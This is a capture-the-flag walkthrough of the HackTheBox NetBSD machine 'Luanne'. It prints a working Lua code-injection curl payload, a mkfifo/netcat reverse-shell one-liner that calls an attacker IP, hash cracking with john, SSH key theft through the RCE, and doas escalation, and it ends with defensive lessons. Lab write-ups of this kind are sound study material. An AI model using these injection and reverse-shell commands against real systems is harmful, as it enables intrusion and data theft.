---
title: "Luanne"
date: 2020-11-21
type: docs
tags:
  - htb
  - netbsd
  - medium
  - supervisor
  - default-credentials
  - lua-injection
  - rce
  - verb-tampering
  - john
  - ssh-key
  - netpgp
  - doas
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** NetBSD 9.0, **Difficulty:** Medium, **Released:** 2020-11-21, **IP:** `10.10.10.218` , `luanne.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. nginx `:80` (Basic auth) proxies a **Lua** web API. `:9001` is a **Supervisor / Medusa** panel with default creds **`user : 123`**.
2. The Supervisor config points at the Lua weather API. `GET /weather/forecast?city=` is code injectable: `city=') os.execute('id') --` runs commands as **`_httpd`**.
3. Reverse shell. `/var/www/.htpasswd` , `webapi_user:$1$...` , crack with john (`iamthebest`).
4. Use the RCE (or the shell) to read `r.michaels`' SSH private key from `http://127.0.0.1:3001/` (or the file path). SSH as **`r.michaels`**.
5. `~/backups/devel_backup-*.tar.gz.enc` decrypts with **`netpgp --decrypt`** (r.michaels' key is in the keyring). Inside is a newer `.htpasswd` (`webapi_user:$1$6xc7I/LW$...`), crack it (`littlebear`).
6. `doas -u root <cmd>` accepts that password. **Root** (`doas` is NetBSD's `sudo`).

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| Supervisor panel | `user : 123` |
| `webapi_user` (live `.htpasswd`) | `iamthebest` |
| `webapi_user` (backup `.htpasswd`), also the `doas` password | `littlebear` |
| `user.txt` | `/home/r.michaels/user.txt` |
| `root.txt` | `/root/root.txt` , `7a9b5c206e8e8ba09bb99bd113675f66` |

</div>

---

## Overview

Luanne is a NetBSD box (a rare treat) and the lesson is "read every config the low priv services hand you". The **Supervisor** panel on 9001 has default creds and its config tells you exactly where the Lua API lives and how it is routed. The foothold is **Lua code injection**: the weather endpoint drops your `city` value into a Lua string that gets `assert(loadstring(...))`-style evaluated, so `') os.execute('...') --` is RCE. Then it is john on `.htpasswd`, an SSH key read through the RCE, a **`netpgp`** encrypted backup with a second `.htpasswd`, and `doas` (which on NetBSD replaces `sudo`).

Related default-credential panels: [Monitored](/writeups/hackthebox/linux/medium/monitored/). Related "config file tells you the layout": [Heal](/writeups/hackthebox/linux/medium/heal/), **Nagios in Monitored**. Related SSTI / code injection in a scripting language: [Perfection](/writeups/hackthebox/linux/easy/perfection/) (ERB), [Bolt](/writeups/hackthebox/linux/medium/bolt/) (Jinja2). Related GPG/PGP encrypted loot: [Environment](/writeups/hackthebox/linux/medium/environment/), [Bolt](/writeups/hackthebox/linux/medium/bolt/).

---

## Full Walkthrough

### Recon

`luanne.htb` on port 80 prompts for Basic auth. Cancelling shows a 401 and mentions an internal server on port 3000.

```console
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418; protocol 2.0)
80/tcp   open  http    nginx 1.19.0
| http-method-tamper:
|   VULNERABLE: Authentication bypass by HTTP verb tampering
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
```

(nmap / nikto dumps trimmed.)

<div class="callout callout-note">

**Two ways past the Basic auth**

nmap flags **HTTP verb tampering**: the nginx config restricts `GET`/`POST` with `limit_except`, so a `HEAD` (or an unlisted method like `PUT`) request to a protected path is served without credentials. That is one route to the Lua endpoints. The route my notes took is simpler: the Supervisor panel on 9001.

</div>

### Supervisor default creds

```
http://luanne.htb:9001/
```

since it is running Medusa/Supervisor, we looked up the default creds: **`user : 123`**. The panel and its `/logtail` links reveal the Lua weather API and the paths `/weather/forecast` and `/weather/forecastlist`.

### Lua code injection

```bash
curl -G --data-urlencode "city=') os.execute('id') --" 'http://10.10.10.218/weather/forecast' -s
```

```json
{"code": 500, "error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)"}
```

<div class="callout callout-note">

**Why this executes**

`weather.lua` builds a query string and passes user input into a Lua expression that ends up evaluated (`loadstring`/`load` on a constructed string, or a `string.format` that reaches an `os` call). `') os.execute('id') --` closes the intended string/call, runs `os.execute`, and comments out the tail. The output comes back in the error because the code runs before the "unknown city" branch. Same class as Python `eval`, Ruby ERB, PHP `system` on a variable function.

</div>

We messed with the URL, hit a syntax error, then found the RCE. That test confirmed system command execution, so we put a reverse shell in:

```bash
curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 9001 >/tmp/f') --" 'http://luanne.htb/weather/forecast' -s
```

Shell as `_httpd`.

### _httpd to r.michaels

```console
$ cat /var/www/.htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

```console
$ john --wordlist=rockyou.txt hash
iamthebest       (webapi_user)      # md5crypt ($1$)
```

The internal server on port 3000 (a second `bozohttpd` instance, this one serving `r.michaels`' home over HTTP with the `~user` feature) exposes the SSH key. Read it through the RCE:

```bash
curl -G --data-urlencode "city=') os.execute('curl -s --path-as-is http://127.0.0.1:3001/~r.michaels/id_rsa') --" 'http://luanne.htb/weather/forecast' -s
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (trimmed) ...
-----END OPENSSH PRIVATE KEY-----
```

```bash
ssh -i id_rsa r.michaels@luanne.htb
```

### Privilege Escalation, netpgp backup then doas

```console
luanne$ ls ~/backups
devel_backup-2020-09-16.tar.gz.enc
```

<div class="callout callout-note">

**`netpgp` on NetBSD**

NetBSD ships **`netpgp`** instead of GnuPG. `netpgp --decrypt` uses the keyring in `~/.gnupg` (or `~/.netpgp`), and r.michaels' private key is already there, so no passphrase battle. The encrypted backup is just a `.tar.gz` once decrypted.

</div>

```console
luanne$ netpgp --decrypt --output=/tmp/devel.tar.gz ~/backups/devel_backup-2020-09-16.tar.gz.enc
luanne$ cd /tmp && tar xzf devel.tar.gz
luanne$ cat devel-2020-09-16/www/.htpasswd
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```

```console
$ john --wordlist=rockyou.txt hash2
littlebear       (webapi_user)
```

That password is r.michaels' `doas` password:

```console
luanne$ doas -u root cat /root/root.txt
Password: littlebear
7a9b5c206e8e8ba09bb99bd113675f66
```

<div class="callout callout-note">

**`doas` is NetBSD/OpenBSD's `sudo`**

`/etc/doas.conf` here has `permit r.michaels as root`, which prompts for r.michaels' own password. `doas -u root sh` gives a full root shell. We searched for the sudo alternative on NetBSD and that was it.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/r.michaels/user.txt` |
| `root.txt` | `/root/root.txt` , `7a9b5c206e8e8ba09bb99bd113675f66` |

---

## Lessons and Takeaways

- **Change default credentials on every management panel.** Supervisor's config handed over the whole app layout.
- **Never build code from user input.** Lua `loadstring`/`load` on request data is RCE, just like `eval` anywhere else. Parameterise.
- **Restrict HTTP methods properly.** `limit_except GET POST` still allows `HEAD` and can be bypassed with an unlisted verb. Use `if ($request_method !~ ^(GET|POST)$) { return 405; }`.
- **Do not serve home directories over HTTP.** `bozohttpd`'s `~user` feature exposed the SSH key.
- **`.htpasswd` uses fast hashes (md5crypt / crypt).** Anything in rockyou falls instantly. Use a strong random value.
- **Know the platform.** On BSD it is `doas`, `pkg_add`, `netpgp`, `/etc/rc.conf`.

---

## Related Writeups

- **Default credentials on a panel:** [Monitored](/writeups/hackthebox/linux/medium/monitored/)
- **Code injection in a scripting language (Lua / ERB / Jinja2):** [Perfection](/writeups/hackthebox/linux/easy/perfection/), [Bolt](/writeups/hackthebox/linux/medium/bolt/)
- **HTTP verb tampering auth bypass:** [Luanne](/writeups/hackthebox/bsd/medium/luanne/) is the reference
- **PGP / GPG encrypted loot:** [Environment](/writeups/hackthebox/linux/medium/environment/), [Bolt](/writeups/hackthebox/linux/medium/bolt/)

## References

- Supervisor default credentials <http://supervisord.org/configuration.html#inet-http-server-section-settings>
- OWASP verb tampering <https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods>
- netpgp(1) NetBSD <https://man.netbsd.org/netpgp.1>
- doas(1) <https://man.openbsd.org/doas>
